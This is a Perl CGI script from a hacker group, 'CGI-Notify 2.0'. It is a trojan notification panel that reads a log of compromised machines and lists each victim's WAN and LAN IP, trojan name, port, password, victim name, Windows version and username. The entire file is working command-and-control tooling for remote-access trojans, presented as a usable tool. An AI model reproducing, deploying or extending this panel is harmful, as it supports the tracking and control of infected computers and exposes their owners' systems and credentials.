#!/usr/bin/perl 
print "Content-type:text/html\n\n";

#################################################################
#              				               	        #
#       CGI-LOGGER v.1.0  Written by:Nilez(nilez@mail.com)      #
# ------------------------------------------------------------- #
#         Modified for use with CGI-Notifier 2.0                #
#                                                               #
#                       by: illwill                             #
#         www.illmob.org            xillwillx@yahoo.com         #
#                          2/22/02                              #
#################################################################


$in = $ENV{'QUERY_STRING'};
@in = split(/[&;]/,$in); 
foreach $i (0 .. $#in) {	
  $in[$i] =~ s/\+/ /g;	
  ($key, $val) = split(/=/,$in[$i],2);	
  $key =~ s/%([A-Fa-f0-9]{2})/pack("c",hex($1))/ge;	
  $val =~ s/%([A-Fa-f0-9]{2})/pack("c",hex($1))/ge;	
  $in{$key} .= "\0" if (defined($in{$key}));	 
  $in{$key} .= $val;
}

 
  $bestand='log.txt';
  $correctpass = "";
  $scriptlocation = "http://th3hack.netfirms.com/cgi-bin/list.cgi";
  $password = $in{'password'};
  $function = $in{'function'};

open (FILE,"+<$bestand") || die "Can't open $bestand: $!\n"; 
@list = <FILE>;
close(FILE);

@days   = ('Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday');
($sec,$min,$hour,$mday,$mon,$year,$wday) = (localtime(time))[0,1,2,3,4,5,6];
$time = sprintf("%02d:%02d:%02d",$hour,$min,$sec);
$date = "$days[$wday] $mday, $time";

if ($correctpass eq "")
{
 &show_list;
}

if ($function eq "post") {
      if ($password eq $correctpass) {
          &show_list;
          exit;
       }
      &wrong_password;
   }
 &ask_password;


sub wrong_password {
    print "<HTML>\n";
    print "<HEAD><TITLE>CGI-Notify  by illwill[invalid password]</Title></HEAD>\n";
    print "<BODY BGCOLOR=#CCCCCC>\n";
    print "<table width=40% cellpadding=1 cellspacing=0  border=1 align=CENTER bgcolor=#000000 bordercolor =#000000><br><br><br>\n";
    print "<center><tr bgcolor=#006699><td><center><table><font color=#CCCCCC font style=font-size:13 face=Verdana><b>Invalid password, try again:</b></font></table></center></tr></center>\n";
    print "<tr bgcolor=#CCCCCC><td><center><table border=0 cellpadding=4 cellspacing=0><tr><br></tr></table></center>\n";  
    print "<CENTER><FORM ACTION=$scriptlocation>\n";
    print "<INPUT TYPE=password  NAME=password SIZE=30%>\n";
    print "<INPUT TYPE=hidden NAME=function VALUE=post>\n";
    print "<INPUT TYPE=submit VALUE=\"   OK   \">\n";
    print "</FORM></CENTER>\n";
    print "</td></tr></table>\n";   
    print "</BODY></HTML>\n";
    exit;
}

sub ask_password {
   print "<HTML>\n";
    print "<HEAD><TITLE>CGI-Notify  by illwill [enter password]</Title></HEAD>\n";
    print "<BODY BGCOLOR=#CCCCCC>\n";
    print "<table width=40% cellpadding=1 cellspacing=0  border=1 align=CENTER bgcolor=#000000 bordercolor =#000000><br><br><br>\n";
    print "<center><tr bgcolor=#006699><td><center><table><font color=#CCCCCC font style=font-size:11 face=Verdana><b>Please enter password:</b></font></table></center></tr></center>\n";
    print "<tr bgcolor=#CCCCCC><td><center><table border=0 cellpadding=4 cellspacing=0><tr><br></tr></table></center>\n";  
    print "<CENTER><FORM ACTION=$scriptlocation>\n";
    print "<INPUT TYPE=password  NAME=password SIZE=30%>\n";
    print "<INPUT TYPE=hidden NAME=function VALUE=post>\n";
    print "<INPUT TYPE=submit VALUE=\"   OK   \">\n";
    print "</FORM></CENTER>\n";
    print "</td></tr></table>\n";   
    print "</BODY></HTML>\n";
    exit;
}


sub show_list {
    print "<HTML>\n";
    print "<HEAD><TITLE>CGI-Notify 2.0  by illwill</Title>\n";
    print "<style type=text/css><!--BODY {SCROLLBAR-FACE-COLOR:#FFFFFF; SCROLLBAR-HIGHLIGHT-COLOR:#3399FF; SCROLLBAR-SHADOW-COLOR: #3399FF; SCROLLBAR-ARROW-COLOR:  #FFFFFF; SCROLLBAR-TRACK-COLOR: #FFFFFF; } A:active {COLOR: #2092B0; FONT-FAMILY: Verdana; TEXT-DECORATION: none} A:hover {COLOR: #2092B0; FONT-FAMILY: Verdana; TEXT-DECORATION: none} A:link {COLOR: #006699; FONT-FAMILY: Verdana; TEXT-DECORATION: none} A {COLOR: #006699; FONT-FAMILY: Verdana; TEXT-DECORATION: none} -->\n";
    print "</style></HEAD><body bgcolor=#000000 background=\"../images/asmback2.jpg\"><center><img src=\"../images/top.jpg\"><BR><font color=#006699 style=font-size:18 face=Verdana><b>CGI-Notify 2.0  by illwill</b></font><br><br><hr width=500 align=center>\n";
    print "<br><table border =1 cellpadding =4 cellspacing =0 bgcolor =#006699 bordercolor = #000000>
    <td><center><font color=#000000 style=font-size:9 face=Verdana><b>WAN IP</td>
    <td><center><font color=#000000 style=font-size:9 face=Verdana><b>LAN IP</td>
    <td><center><font color=#000000 style=font-size:9 face=Verdana><b>Trojan</td>
    <td><center><font color=#000000 style=font-size:9 face=Verdana><b>Port</td>
    <td><center><font color=#000000 style=font-size:9 face=Verdana><b>Password</td>
    <td><center><font color=#000000 style=font-size:9 face=Verdana><b>Victim name</td>
    <td><center><font color=#000000 style=font-size:9 face=Verdana><b>Windows Version</td>
    <td><center><font color=#000000 style=font-size:9 face=Verdana><b>UserName</td>
    <td><center><font color=#000000 style=font-size:9 face=Verdana><b>Time  Posted</td>@list\n";
    print "</td><div align=right><font color=#006699 style=font-size:9 face=Verdana>Current Server Time: $date</font></div></td></table></center><br>\n";
    print "<BODY BGCOLOR=#CCCCCC>\n";
    print "</BODY></HTML>\n";
    exit;
}